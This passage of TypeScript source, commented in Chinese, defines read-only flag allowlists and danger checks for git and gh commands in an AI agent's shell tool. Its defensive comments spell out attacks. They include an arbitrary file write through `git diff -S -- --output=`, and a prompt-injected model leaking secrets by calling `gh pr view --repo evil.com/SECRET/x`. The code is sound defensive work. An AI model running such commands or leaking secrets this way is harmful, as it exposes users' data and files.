// Shell 类 Tool 共享的只读外部命令配置表(git/gh/docker)与旗标验证器。
// 对照移植自 Claude src/utils/shell/readOnlyCommandValidation.ts,只保留
// PowerShellTool security/ 传递依赖到的符号;RIPGREP_READ_ONLY_COMMANDS 与
// PYRIGHT_READ_ONLY_COMMANDS 未被任何被搬符号引用,不搬。
// getPlatform() 已按约定替换为 process.platform。

// ---------------------------------------------------------------------------
// 类型
// ---------------------------------------------------------------------------

export type FlagArgType =
  | 'none' // 无参数(--color、-n)
  | 'number' // 整数参数(--context=3)
  | 'string' // 任意字符串参数(--relative=path)
  | 'char' // 单字符(分隔符)
  | '{}' // 仅字面量 "{}"
  | 'EOF' // 仅字面量 "EOF"

export type ExternalCommandConfig = {
  safeFlags: Record<string, FlagArgType>;
  // 返回 true 表示命令危险,false 表示安全。
  // args 是命令名之后的 token 列表(如 "git branch" 之后的部分)。
  additionalCommandIsDangerousCallback?: (
    rawCommand: string,
    args: string[],
  ) => boolean;
  // 为 false 时该工具不遵守 POSIX `--` 选项终止约定。
  // validateFlags 会在 `--` 之后继续检查旗标而不是 break。
  // 默认:true(大多数工具遵守 `--`)。
  respectsDoubleDash?: boolean;
};

// ---------------------------------------------------------------------------
// 共享 git 旗标分组
// ---------------------------------------------------------------------------

const GIT_REF_SELECTION_FLAGS: Record<string, FlagArgType> = {
  '--all': 'none',
  '--branches': 'none',
  '--tags': 'none',
  '--remotes': 'none',
};

const GIT_DATE_FILTER_FLAGS: Record<string, FlagArgType> = {
  '--since': 'string',
  '--after': 'string',
  '--until': 'string',
  '--before': 'string',
};

const GIT_LOG_DISPLAY_FLAGS: Record<string, FlagArgType> = {
  '--oneline': 'none',
  '--graph': 'none',
  '--decorate': 'none',
  '--no-decorate': 'none',
  '--date': 'string',
  '--relative-date': 'none',
};

const GIT_COUNT_FLAGS: Record<string, FlagArgType> = {
  '--max-count': 'number',
  '-n': 'number',
};

// Stat 输出旗标——用于 git log、show、diff
const GIT_STAT_FLAGS: Record<string, FlagArgType> = {
  '--stat': 'none',
  '--numstat': 'none',
  '--shortstat': 'none',
  '--name-only': 'none',
  '--name-status': 'none',
};

// 颜色输出旗标——用于 git log、show、diff
const GIT_COLOR_FLAGS: Record<string, FlagArgType> = {
  '--color': 'none',
  '--no-color': 'none',
};

// Patch 显示旗标——用于 git log、show
const GIT_PATCH_FLAGS: Record<string, FlagArgType> = {
  '--patch': 'none',
  '-p': 'none',
  '--no-patch': 'none',
  '--no-ext-diff': 'none',
  '-s': 'none',
};

// 作者/提交者过滤旗标——用于 git log、reflog
const GIT_AUTHOR_FILTER_FLAGS: Record<string, FlagArgType> = {
  '--author': 'string',
  '--committer': 'string',
  '--grep': 'string',
};

// ---------------------------------------------------------------------------
// GIT_READ_ONLY_COMMANDS —— 全部 git 只读子命令的完整映射
// ---------------------------------------------------------------------------

export const GIT_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
  'git diff': {
    safeFlags: {
      ...GIT_STAT_FLAGS,
      ...GIT_COLOR_FLAGS,
      // 显示与比较旗标
      '--dirstat': 'none',
      '--summary': 'none',
      '--patch-with-stat': 'none',
      '--word-diff': 'none',
      '--word-diff-regex': 'string',
      '--color-words': 'none',
      '--no-renames': 'none',
      '--no-ext-diff': 'none',
      '--check': 'none',
      '--ws-error-highlight': 'string',
      '--full-index': 'none',
      '--binary': 'none',
      '--abbrev': 'number',
      '--break-rewrites': 'none',
      '--find-renames': 'none',
      '--find-copies': 'none',
      '--find-copies-harder': 'none',
      '--irreversible-delete': 'none',
      '--diff-algorithm': 'string',
      '--histogram': 'none',
      '--patience': 'none',
      '--minimal': 'none',
      '--ignore-space-at-eol': 'none',
      '--ignore-space-change': 'none',
      '--ignore-all-space': 'none',
      '--ignore-blank-lines': 'none',
      '--inter-hunk-context': 'number',
      '--function-context': 'none',
      '--exit-code': 'none',
      '--quiet': 'none',
      '--cached': 'none',
      '--staged': 'none',
      '--pickaxe-regex': 'none',
      '--pickaxe-all': 'none',
      '--no-index': 'none',
      '--relative': 'string',
      // Diff 过滤
      '--diff-filter': 'string',
      // 短旗标
      '-p': 'none',
      '-u': 'none',
      '-s': 'none',
      '-M': 'none',
      '-C': 'none',
      '-B': 'none',
      '-D': 'none',
      '-l': 'none',
      // 安全:-S/-G/-O 接受必填字符串参数(pickaxe 搜索串、pickaxe 正则、
      // orderfile)。此前标为 'none' 会与 git 产生解析差异:
      // `git diff -S -- --output=/tmp/pwned` —— 校验器认为 -S 无参 → 前进
      // 1 个 token → 遇到 `--` 停止 → --output 未被检查。而 git 认为 -S
      // 必填参数 → 无条件把 `--` 吃掉作为 pickaxe 字符串(标准 getopt:
      // 必填参数选项无条件消费下一个 argv,先于顶层 `--` 判断)→ 游标落在
      // --output=... → 按长选项解析 → 任意文件写。
      // 下方 git log 配置已正确把 -S/-G 标为 'string'。
      '-S': 'string',
      '-G': 'string',
      '-O': 'string',
      '-R': 'none',
    },
  },
  'git log': {
    safeFlags: {
      ...GIT_LOG_DISPLAY_FLAGS,
      ...GIT_REF_SELECTION_FLAGS,
      ...GIT_DATE_FILTER_FLAGS,
      ...GIT_COUNT_FLAGS,
      ...GIT_STAT_FLAGS,
      ...GIT_COLOR_FLAGS,
      ...GIT_PATCH_FLAGS,
      ...GIT_AUTHOR_FILTER_FLAGS,
      // 其他显示旗标
      '--abbrev-commit': 'none',
      '--full-history': 'none',
      '--dense': 'none',
      '--sparse': 'none',
      '--simplify-merges': 'none',
      '--ancestry-path': 'none',
      '--source': 'none',
      '--first-parent': 'none',
      '--merges': 'none',
      '--no-merges': 'none',
      '--reverse': 'none',
      '--walk-reflogs': 'none',
      '--skip': 'number',
      '--max-age': 'number',
      '--min-age': 'number',
      '--no-min-parents': 'none',
      '--no-max-parents': 'none',
      '--follow': 'none',
      // 提交遍历旗标
      '--no-walk': 'none',
      '--left-right': 'none',
      '--cherry-mark': 'none',
      '--cherry-pick': 'none',
      '--boundary': 'none',
      // 排序旗标
      '--topo-order': 'none',
      '--date-order': 'none',
      '--author-date-order': 'none',
      // 格式控制
      '--pretty': 'string',
      '--format': 'string',
      // Diff 过滤
      '--diff-filter': 'string',
      // Pickaxe 搜索(查找添加/删除某字符串的提交)
      '-S': 'string',
      '-G': 'string',
      '--pickaxe-regex': 'none',
      '--pickaxe-all': 'none',
    },
  },
  'git show': {
    safeFlags: {
      ...GIT_LOG_DISPLAY_FLAGS,
      ...GIT_STAT_FLAGS,
      ...GIT_COLOR_FLAGS,
      ...GIT_PATCH_FLAGS,
      // 其他显示旗标
      '--abbrev-commit': 'none',
      '--word-diff': 'none',
      '--word-diff-regex': 'string',
      '--color-words': 'none',
      '--pretty': 'string',
      '--format': 'string',
      '--first-parent': 'none',
      '--raw': 'none',
      // Diff 过滤
      '--diff-filter': 'string',
      // 短旗标
      '-m': 'none',
      '--quiet': 'none',
    },
  },
  'git shortlog': {
    safeFlags: {
      ...GIT_REF_SELECTION_FLAGS,
      ...GIT_DATE_FILTER_FLAGS,
      // 摘要选项
      '-s': 'none',
      '--summary': 'none',
      '-n': 'none',
      '--numbered': 'none',
      '-e': 'none',
      '--email': 'none',
      '-c': 'none',
      '--committer': 'none',
      // 分组
      '--group': 'string',
      // 格式化
      '--format': 'string',
      // 过滤
      '--no-merges': 'none',
      '--author': 'string',
    },
  },
  'git reflog': {
    safeFlags: {
      ...GIT_LOG_DISPLAY_FLAGS,
      ...GIT_REF_SELECTION_FLAGS,
      ...GIT_DATE_FILTER_FLAGS,
      ...GIT_COUNT_FLAGS,
      ...GIT_AUTHOR_FILTER_FLAGS,
    },
    // 安全:拦截 `git reflog expire`(位置子命令)——它会通过过期 reflog
    // 条目写入 .git/logs/**。`git reflog delete` 同样会写。只有裸
    // `git reflog`(等价 show)和 `git reflog show` 是安全的。
    // 否则 validateFlags 的非旗标位置参数兜底会把 `expire` 当作普通参数
    // 接受,而 `--all` 又在 GIT_REF_SELECTION_FLAGS 里 → 放行。
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // 拦截已知的可写子命令:expire、delete、exists。
      // 允许:`show`、ref 名(HEAD、refs/*、分支名)。
      // 子命令(若有)是第一个位置参数。`show` 之后或旗标之后的后续
      // 位置参数都是 ref 名(安全)。
      const DANGEROUS_SUBCOMMANDS = new Set(['expire', 'delete', 'exists']);
      for (const token of args) {
        if (!token || token.startsWith('-')) continue;
        // 第一个非旗标位置参数:检查是否为危险子命令。
        // 若是 `show` 或 `HEAD`/`refs/...` 之类的 ref 名,则安全。
        if (DANGEROUS_SUBCOMMANDS.has(token)) {
          return true; // 危险子命令——会写 .git/logs/**
        }
        // 第一个位置参数安全(show/HEAD/ref)——后续都是 ref 参数
        return false;
      }
      return false; // 无位置参数 = 裸 `git reflog` = 安全(显示 reflog)
    },
  },
  'git stash list': {
    safeFlags: {
      ...GIT_LOG_DISPLAY_FLAGS,
      ...GIT_REF_SELECTION_FLAGS,
      ...GIT_COUNT_FLAGS,
    },
  },
  'git ls-remote': {
    safeFlags: {
      // 分支/标签过滤旗标
      '--branches': 'none',
      '-b': 'none',
      '--tags': 'none',
      '-t': 'none',
      '--heads': 'none',
      '-h': 'none',
      '--refs': 'none',
      // 输出控制旗标
      '--quiet': 'none',
      '-q': 'none',
      '--exit-code': 'none',
      '--get-url': 'none',
      '--symref': 'none',
      // 排序旗标
      '--sort': 'string',
      // 协议旗标
      // 安全:--server-option 与 -o 被刻意排除。它们会在 protocol v2 的
      // capability 宣告中把任意攻击者可控字符串发送给远端 git 服务器。
      // 这在本应只读的命令上构成了网络写原语(向远端发送数据)。即使没有
      // 命令替换(已由别处拦截),`--server-option="sensitive-data"` 也会把
      // 该值外泄到 origin 指向的任何服务器。只读路径绝不应开启网络写。
    },
  },
  'git status': {
    safeFlags: {
      // 输出格式旗标
      '--short': 'none',
      '-s': 'none',
      '--branch': 'none',
      '-b': 'none',
      '--porcelain': 'none',
      '--long': 'none',
      '--verbose': 'none',
      '-v': 'none',
      // 未跟踪文件处理
      '--untracked-files': 'string',
      '-u': 'string',
      // 忽略选项
      '--ignored': 'none',
      '--ignore-submodules': 'string',
      // 列显示
      '--column': 'none',
      '--no-column': 'none',
      // Ahead/behind 信息
      '--ahead-behind': 'none',
      '--no-ahead-behind': 'none',
      // 重命名检测
      '--renames': 'none',
      '--no-renames': 'none',
      '--find-renames': 'string',
      '-M': 'string',
    },
  },
  'git blame': {
    safeFlags: {
      ...GIT_COLOR_FLAGS,
      // 行范围
      '-L': 'string',
      // 输出格式
      '--porcelain': 'none',
      '-p': 'none',
      '--line-porcelain': 'none',
      '--incremental': 'none',
      '--root': 'none',
      '--show-stats': 'none',
      '--show-name': 'none',
      '--show-number': 'none',
      '-n': 'none',
      '--show-email': 'none',
      '-e': 'none',
      '-f': 'none',
      // 日期格式
      '--date': 'string',
      // 忽略空白
      '-w': 'none',
      // 忽略修订
      '--ignore-rev': 'string',
      '--ignore-revs-file': 'string',
      // 移动/复制检测
      '-M': 'none',
      '-C': 'none',
      '--score-debug': 'none',
      // 缩写
      '--abbrev': 'number',
      // 其他选项
      '-s': 'none',
      '-l': 'none',
      '-t': 'none',
    },
  },
  'git ls-files': {
    safeFlags: {
      // 文件选择
      '--cached': 'none',
      '-c': 'none',
      '--deleted': 'none',
      '-d': 'none',
      '--modified': 'none',
      '-m': 'none',
      '--others': 'none',
      '-o': 'none',
      '--ignored': 'none',
      '-i': 'none',
      '--stage': 'none',
      '-s': 'none',
      '--killed': 'none',
      '-k': 'none',
      '--unmerged': 'none',
      '-u': 'none',
      // 输出格式
      '--directory': 'none',
      '--no-empty-directory': 'none',
      '--eol': 'none',
      '--full-name': 'none',
      '--abbrev': 'number',
      '--debug': 'none',
      '-z': 'none',
      '-t': 'none',
      '-v': 'none',
      '-f': 'none',
      // 排除模式
      '--exclude': 'string',
      '-x': 'string',
      '--exclude-from': 'string',
      '-X': 'string',
      '--exclude-per-directory': 'string',
      '--exclude-standard': 'none',
      // 错误处理
      '--error-unmatch': 'none',
      // 递归
      '--recurse-submodules': 'none',
    },
  },
  'git config --get': {
    safeFlags: {
      // 无需额外旗标——只是读取配置值
      '--local': 'none',
      '--global': 'none',
      '--system': 'none',
      '--worktree': 'none',
      '--default': 'string',
      '--type': 'string',
      '--bool': 'none',
      '--int': 'none',
      '--bool-or-int': 'none',
      '--path': 'none',
      '--expiry-date': 'none',
      '-z': 'none',
      '--null': 'none',
      '--name-only': 'none',
      '--show-origin': 'none',
      '--show-scope': 'none',
    },
  },
  // 注意:'git remote show' 必须排在 'git remote' 之前,保证更长的模式先匹配
  'git remote show': {
    safeFlags: {
      '-n': 'none',
    },
    // 只允许可选的 -n,然后是一个字母数字组成的 remote 名
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // 滤掉已知安全旗标
      const positional = args.filter(a => a !== '-n');
      // 必须恰好有一个位置参数,且形如 remote 名
      if (positional.length !== 1) return true;
      return !/^[a-zA-Z0-9_-]+$/.test(positional[0]!);
    },
  },
  'git remote': {
    safeFlags: {
      '-v': 'none',
      '--verbose': 'none',
    },
    // 只允许裸 'git remote' 或 'git remote -v/--verbose'
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // 所有参数都必须是已知安全旗标;不允许任何位置参数
      return args.some(a => a !== '-v' && a !== '--verbose');
    },
  },
  // git merge-base 是只读命令,用于查找共同祖先
  'git merge-base': {
    safeFlags: {
      '--is-ancestor': 'none', // 检查第一个提交是否为第二个的祖先
      '--fork-point': 'none', // 查找 fork 点
      '--octopus': 'none', // 查找多个 ref 的最佳共同祖先
      '--independent': 'none', // 过滤互相独立的 ref
      '--all': 'none', // 输出全部 merge base
    },
  },
  // git rev-parse 是纯读命令——把 ref 解析为 SHA、查询仓库路径
  'git rev-parse': {
    safeFlags: {
      // SHA 解析与验证
      '--verify': 'none', // 验证恰好一个参数是合法对象名
      '--short': 'string', // 缩写输出(可用 =N 指定长度)
      '--abbrev-ref': 'none', // ref 的符号名
      '--symbolic': 'none', // 输出符号名
      '--symbolic-full-name': 'none', // 含 refs/heads/ 前缀的完整符号名
      // 仓库路径查询(全部只读)
      '--show-toplevel': 'none', // 顶层目录的绝对路径
      '--show-cdup': 'none', // 回到顶层所需的路径组件
      '--show-prefix': 'none', // 从顶层到 cwd 的相对路径
      '--git-dir': 'none', // .git 目录路径
      '--git-common-dir': 'none', // 公共目录路径(主 worktree 的 .git)
      '--absolute-git-dir': 'none', // .git 目录的绝对路径
      '--show-superproject-working-tree': 'none', // 父项目根(若是 submodule)
      // 布尔查询
      '--is-inside-work-tree': 'none',
      '--is-inside-git-dir': 'none',
      '--is-bare-repository': 'none',
      '--is-shallow-repository': 'none',
      '--is-shallow-update': 'none',
      '--path-prefix': 'none',
    },
  },
  // git rev-list 是只读提交枚举——列出/统计从 ref 可达的提交
  'git rev-list': {
    safeFlags: {
      ...GIT_REF_SELECTION_FLAGS,
      ...GIT_DATE_FILTER_FLAGS,
      ...GIT_COUNT_FLAGS,
      ...GIT_AUTHOR_FILTER_FLAGS,
      // 计数
      '--count': 'none', // 输出提交数而不是列表
      // 遍历控制
      '--reverse': 'none',
      '--first-parent': 'none',
      '--ancestry-path': 'none',
      '--merges': 'none',
      '--no-merges': 'none',
      '--min-parents': 'number',
      '--max-parents': 'number',
      '--no-min-parents': 'none',
      '--no-max-parents': 'none',
      '--skip': 'number',
      '--max-age': 'number',
      '--min-age': 'number',
      '--walk-reflogs': 'none',
      // 输出格式
      '--oneline': 'none',
      '--abbrev-commit': 'none',
      '--pretty': 'string',
      '--format': 'string',
      '--abbrev': 'number',
      '--full-history': 'none',
      '--dense': 'none',
      '--sparse': 'none',
      '--source': 'none',
      '--graph': 'none',
    },
  },
  // git describe 是只读——相对最近的 tag 描述提交
  'git describe': {
    safeFlags: {
      // Tag 选择
      '--tags': 'none', // 考虑所有 tag,不仅是附注 tag
      '--match': 'string', // 只考虑匹配 glob 的 tag
      '--exclude': 'string', // 不考虑匹配 glob 的 tag
      // 输出控制
      '--long': 'none', // 总是输出长格式(tag-distance-ghash)
      '--abbrev': 'number', // 把对象名缩写为 N 个十六进制位
      '--always': 'none', // 兜底显示唯一缩写对象
      '--contains': 'none', // 查找包含该提交的 tag
      '--first-match': 'none', // 优先最接近顶端的 tag(首个匹配即停)
      '--exact-match': 'none', // 仅当精确匹配(tag 指向该提交)才输出
      '--candidates': 'number', // 限制选取候选前的遍历数量
      // 后缀/脏标记
      '--dirty': 'none', // 工作区有改动时追加 "-dirty"
      '--broken': 'none', // 仓库处于非法状态时追加 "-broken"
    },
  },
  // git cat-file 是只读对象检查——显示对象的类型、大小或内容
  // 注意:--batch(不带 --check)被刻意排除——它从 stdin 读任意对象,
  // 在管道命令中可能被利用来转储敏感对象。
  'git cat-file': {
    safeFlags: {
      // 对象查询模式(全部纯只读)
      '-t': 'none', // 打印对象类型
      '-s': 'none', // 打印对象大小
      '-p': 'none', // 美化打印对象内容
      '-e': 'none', // 对象存在则退出码为零,否则非零
      // 批处理模式——仅允许只读的 check 变体
      '--batch-check': 'none', // 对 stdin 的每个对象打印类型与大小(不含内容)
      // 输出控制
      '--allow-undetermined-type': 'none',
    },
  },
  // git for-each-ref 是只读 ref 迭代——按可选格式与过滤条件列出 ref
  'git for-each-ref': {
    safeFlags: {
      // 输出格式
      '--format': 'string', // 使用 %(fieldname) 占位符的格式串
      // 排序
      '--sort': 'string', // 按 key 排序(如 refname、creatordate、version:refname)
      // 限量
      '--count': 'number', // 最多输出 N 个 ref
      // 过滤
      '--contains': 'string', // 只列包含指定提交的 ref
      '--no-contains': 'string', // 只列不包含指定提交的 ref
      '--merged': 'string', // 只列从指定提交可达的 ref
      '--no-merged': 'string', // 只列从指定提交不可达的 ref
      '--points-at': 'string', // 只列指向指定对象的 ref
    },
  },
  // git grep 是只读——在受跟踪文件中搜索模式
  'git grep': {
    safeFlags: {
      // 模式匹配方式
      '-e': 'string', // 模式
      '-E': 'none', // 扩展正则
      '--extended-regexp': 'none',
      '-G': 'none', // 基本正则(默认)
      '--basic-regexp': 'none',
      '-F': 'none', // 固定字符串
      '--fixed-strings': 'none',
      '-P': 'none', // Perl 正则
      '--perl-regexp': 'none',
      // 匹配控制
      '-i': 'none', // 忽略大小写
      '--ignore-case': 'none',
      '-v': 'none', // 反选
      '--invert-match': 'none',
      '-w': 'none', // 整词匹配
      '--word-regexp': 'none',
      // 输出控制
      '-n': 'none', // 行号
      '--line-number': 'none',
      '-c': 'none', // 计数
      '--count': 'none',
      '-l': 'none', // 有匹配的文件
      '--files-with-matches': 'none',
      '-L': 'none', // 无匹配的文件
      '--files-without-match': 'none',
      '-h': 'none', // 不带文件名
      '-H': 'none', // 带文件名
      '--heading': 'none',
      '--break': 'none',
      '--full-name': 'none',
      '--color': 'none',
      '--no-color': 'none',
      '-o': 'none', // 只输出匹配部分
      '--only-matching': 'none',
      // 上下文
      '-A': 'number', // 后文行数
      '--after-context': 'number',
      '-B': 'number', // 前文行数
      '--before-context': 'number',
      '-C': 'number', // 上下文行数
      '--context': 'number',
      // 多模式布尔运算符
      '--and': 'none',
      '--or': 'none',
      '--not': 'none',
      // 范围控制
      '--max-depth': 'number',
      '--untracked': 'none',
      '--no-index': 'none',
      '--recurse-submodules': 'none',
      '--cached': 'none',
      // 线程
      '--threads': 'number',
      // 静默
      '-q': 'none',
      '--quiet': 'none',
    },
  },
  // git stash show 是只读——显示某个 stash 条目的 diff
  'git stash show': {
    safeFlags: {
      ...GIT_STAT_FLAGS,
      ...GIT_COLOR_FLAGS,
      ...GIT_PATCH_FLAGS,
      // Diff 选项
      '--word-diff': 'none',
      '--word-diff-regex': 'string',
      '--diff-filter': 'string',
      '--abbrev': 'number',
    },
  },
  // git worktree list 是只读——列出关联的工作树
  'git worktree list': {
    safeFlags: {
      '--porcelain': 'none',
      '-v': 'none',
      '--verbose': 'none',
      '--expire': 'string',
    },
  },
  'git tag': {
    safeFlags: {
      // 列表模式旗标
      '-l': 'none',
      '--list': 'none',
      '-n': 'number',
      '--contains': 'string',
      '--no-contains': 'string',
      '--merged': 'string',
      '--no-merged': 'string',
      '--sort': 'string',
      '--format': 'string',
      '--points-at': 'string',
      '--column': 'none',
      '--no-column': 'none',
      '-i': 'none',
      '--ignore-case': 'none',
    },
    // 安全:拦截通过位置参数创建 tag。`git tag foo` 会创建
    // .git/refs/tags/foo(41 字节文件写)——不是只读。这与 `git branch foo`
    // 语义完全相同(下方有同样的回调)。没有此回调,validateFlags 默认的
    // 位置参数兜底会把 `mytag` 当作非旗标参数接受,git tag 就被自动批准。
    // 虽然该写入受限(路径限定在 .git/refs/tags/、内容是固定的 HEAD SHA),
    // 但它违反只读不变量,还可能污染 CI/CD 的 tag 模式匹配,或通过
    // `git tag foo <commit>` 让被遗弃的提交重新可达。
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // 安全用法:`git tag`(列表)、`git tag -l pattern`(过滤列表)、
      // `git tag --contains <ref>`(包含查询)。没有 -l/--list 的裸位置参数
      // 是要创建的 tag 名——危险。
      const flagsWithArgs = new Set([
        '--contains',
        '--no-contains',
        '--merged',
        '--no-merged',
        '--points-at',
        '--sort',
        '--format',
        '-n',
      ]);
      let i = 0;
      let seenListFlag = false;
      let seenDashDash = false;
      while (i < args.length) {
        const token = args[i];
        if (!token) {
          i++;
          continue;
        }
        // `--` 终止旗标解析。其后的所有 token 都是位置参数,即使以 `-`
        // 开头。`git tag -- -l` 会创建一个名为 `-l` 的 tag。
        if (token === '--' && !seenDashDash) {
          seenDashDash = true;
          i++;
          continue;
        }
        if (!seenDashDash && token.startsWith('-')) {
          // 检查 -l/--list(独立或捆绑形式)。`-li` 捆绑了 -l 与 -i——
          // 两者都是 'none' 类型。Array.includes('-l') 精确匹配会漏掉
          // `-li`、`-il` 这类捆绑,需逐字符检查短旗标捆绑。
          if (token === '--list' || token === '-l') {
            seenListFlag = true;
          } else if (
            token[0] === '-' &&
            token[1] !== '-' &&
            token.length > 2 &&
            !token.includes('=') &&
            token.slice(1).includes('l')
          ) {
            // 含 'l' 的短旗标捆绑,如 -li、-il
            seenListFlag = true;
          }
          if (token.includes('=')) {
            i++;
          } else if (flagsWithArgs.has(token)) {
            i += 2;
          } else {
            i++;
          }
        } else {
          // 非旗标位置参数(或 `--` 之后的位置参数)。只有前面出现过
          // -l/--list 才安全(此时它是模式,不是 tag 名)。
          if (!seenListFlag) {
            return true; // 没有 --list 的位置参数 = 创建 tag
          }
          i++;
        }
      }
      return false;
    },
  },
  'git branch': {
    safeFlags: {
      // 列表模式旗标
      '-l': 'none',
      '--list': 'none',
      '-a': 'none',
      '--all': 'none',
      '-r': 'none',
      '--remotes': 'none',
      '-v': 'none',
      '-vv': 'none',
      '--verbose': 'none',
      // 显示选项
      '--color': 'none',
      '--no-color': 'none',
      '--column': 'none',
      '--no-column': 'none',
      // 安全:--abbrev 保持 'number',让 validateFlags 接受 --abbrev=N
      // (attached 形式,安全)。有问题的是分离形式 `--abbrev N`:
      // git 使用 PARSE_OPT_OPTARG(仅 optional-attached)——分离的 N 会变成
      // 位置参数分支名,从而创建 .git/refs/heads/N。validateFlags 按
      // 'number' 会消费 N,但下方回调会抓住它:--abbrev 已从回调的
      // flagsWithArgs 中移除,回调会把 N 视为没有列表旗标的位置参数 →
      // 危险。双层防御:validateFlags 两种形式都接受,回调拦截分离形式。
      '--abbrev': 'number',
      '--no-abbrev': 'none',
      // 过滤——这些接受 commit/ref 参数
      '--contains': 'string',
      '--no-contains': 'string',
      '--merged': 'none', // 可选 commit 参数——在回调中处理
      '--no-merged': 'none', // 可选 commit 参数——在回调中处理
      '--points-at': 'string',
      // 排序
      '--sort': 'string',
      // 注意:--format 被刻意排除,可能有安全风险
      // 显示当前分支
      '--show-current': 'none',
      '-i': 'none',
      '--ignore-case': 'none',
    },
    // 拦截通过位置参数创建分支(如 "git branch newbranch")
    // 旗标校验由上方 safeFlags 处理
    // args 是 "git branch" 之后的 token
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // 拦截分支创建:"git branch <name>" 或 "git branch <name> <start-point>"
      // 安全用法只有:"git branch"(列表)、"git branch -flags"(带选项列表)、
      // 或 "git branch --contains/--merged 等 <ref>"(过滤)
      // 需要参数的旗标
      const flagsWithArgs = new Set([
        '--contains',
        '--no-contains',
        '--points-at',
        '--sort',
        // --abbrev 已移除:git 不消费分离参数(PARSE_OPT_OPTARG)
      ]);
      // 带可选参数的旗标(不强制,但可以带一个)
      const flagsWithOptionalArgs = new Set(['--merged', '--no-merged']);
      let i = 0;
      let lastFlag = '';
      let seenListFlag = false;
      let seenDashDash = false;
      while (i < args.length) {
        const token = args[i];
        if (!token) {
          i++;
          continue;
        }
        // `--` 终止旗标解析。`git branch -- -l` 会创建名为 `-l` 的分支。
        if (token === '--' && !seenDashDash) {
          seenDashDash = true;
          lastFlag = '';
          i++;
          continue;
        }
        if (!seenDashDash && token.startsWith('-')) {
          // 检查 -l/--list,含短旗标捆绑(-li、-la 等)
          if (token === '--list' || token === '-l') {
            seenListFlag = true;
          } else if (
            token[0] === '-' &&
            token[1] !== '-' &&
            token.length > 2 &&
            !token.includes('=') &&
            token.slice(1).includes('l')
          ) {
            seenListFlag = true;
          }
          if (token.includes('=')) {
            lastFlag = token.split('=')[0] || '';
            i++;
          } else if (flagsWithArgs.has(token)) {
            lastFlag = token;
            i += 2;
          } else {
            lastFlag = token;
            i++;
          }
        } else {
          // 非旗标参数(或 `--` 之后的位置参数)——可能是:
          // 1. 分支名(危险——会创建分支)
          // 2. --list/-l 之后的模式(安全)
          // 3. --merged/--no-merged 之后的可选参数(安全)
          const lastFlagHasOptionalArg = flagsWithOptionalArgs.has(lastFlag);
          if (!seenListFlag && !lastFlagHasOptionalArg) {
            return true; // 没有 --list 或过滤旗标的位置参数 = 创建分支
          }
          i++;
        }
      }
      return false;
    },
  },
};

// ---------------------------------------------------------------------------
// GH_READ_ONLY_COMMANDS —— 仅内部用户开放的 gh CLI 命令(依赖网络)
// ---------------------------------------------------------------------------

// 安全:所有 gh 命令共用的回调,防止网络外泄。
// gh 的 repo 参数接受 `[HOST/]OWNER/REPO`——当 HOST 存在(3 段)时,gh 会
// 连接该主机的 API。被提示注入的模型可以把秘密编码进 OWNER 段,经 DNS/HTTP
// 外泄:
//   gh pr view 1 --repo evil.com/BASE32SECRET/x
//   → GET https://evil.com/api/v3/repos/BASE32SECRET/x/pulls/1
// gh 还接受位置 URL:`gh pr view https://evil.com/owner/repo/pull/1`
//
// git ls-remote 有内联 URL 防护(readOnlyValidation.ts);本回调为 gh 提供
// 等价防护。拒绝:
//   - 任何含 2+ 个斜杠的 token(HOST/OWNER/REPO 形式——正常是 OWNER/REPO)
//   - 任何含 `://` 的 token(URL)
//   - 任何含 `@` 的 token(SSH 风格)
// 同时覆盖 --repo 值与位置 URL/repo 参数,包括等号连接形式
// `--repo=HOST/OWNER/REPO`(cobra 两种形式都接受)。
function ghIsDangerousCallback(_rawCommand: string, args: string[]): boolean {
  for (const token of args) {
    if (!token) continue;
    // 对旗标 token,提取 `=` 之后的值做检查。没有这一步,
    // `--repo=evil.com/SECRET/x`(以 `-` 开头的单 token)会被整个跳过,
    // 绕过 HOST 检查。cobra 把 `--flag=val` 与 `--flag val` 同等对待,
    // 两种形式都必须检查。
    let value = token;
    if (token.startsWith('-')) {
      const eqIdx = token.indexOf('=');
      if (eqIdx === -1) continue; // 无内联值的旗标,没有可检查的内容
      value = token.slice(eqIdx + 1);
      if (!value) continue;
    }
    // 跳过明显不是 repo 规格的值(完全没有 `/`,或纯数字)
    if (
      !value.includes('/') &&
      !value.includes('://') &&
      !value.includes('@')
    ) {
      continue;
    }
    // URL scheme:https://、http://、git://、ssh://
    if (value.includes('://')) {
      return true;
    }
    // SSH 风格:git@host:owner/repo
    if (value.includes('@')) {
      return true;
    }
    // 3+ 段 = HOST/OWNER/REPO(gh 正常格式是 OWNER/REPO,1 个斜杠)
    // 数斜杠:2+ 个斜杠意味着 3+ 段
    const slashCount = (value.match(/\//g) || []).length;
    if (slashCount >= 2) {
      return true;
    }
  }
  return false;
}

export const GH_READ_ONLY_COMMANDS: Record<string, ExternalCommandConfig> = {
  // gh pr view 是只读——显示 PR 详情
  'gh pr view': {
    safeFlags: {
      '--json': 'string', // JSON 字段选择
      '--comments': 'none', // 显示评论
      '--repo': 'string', // 目标仓库(OWNER/REPO)
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh pr list 是只读——列出 PR
  'gh pr list': {
    safeFlags: {
      '--state': 'string', // open、closed、merged、all
      '-s': 'string',
      '--author': 'string',
      '--assignee': 'string',
      '--label': 'string',
      '--limit': 'number',
      '-L': 'number',
      '--base': 'string',
      '--head': 'string',
      '--search': 'string',
      '--json': 'string',
      '--draft': 'none',
      '--app': 'string',
      '--repo': 'string',
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh pr diff 是只读——显示 PR diff
  'gh pr diff': {
    safeFlags: {
      '--color': 'string',
      '--name-only': 'none',
      '--patch': 'none',
      '--repo': 'string',
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh pr checks 是只读——显示 CI 状态检查
  'gh pr checks': {
    safeFlags: {
      '--watch': 'none',
      '--required': 'none',
      '--fail-fast': 'none',
      '--json': 'string',
      '--interval': 'number',
      '--repo': 'string',
      '-R': 'string',
    },
    additionalCommandIsDangerousCallback: ghIsDangerousCallback,
  },
  // gh issue view 是只读——显示 issue 详情
  'gh issue view': {
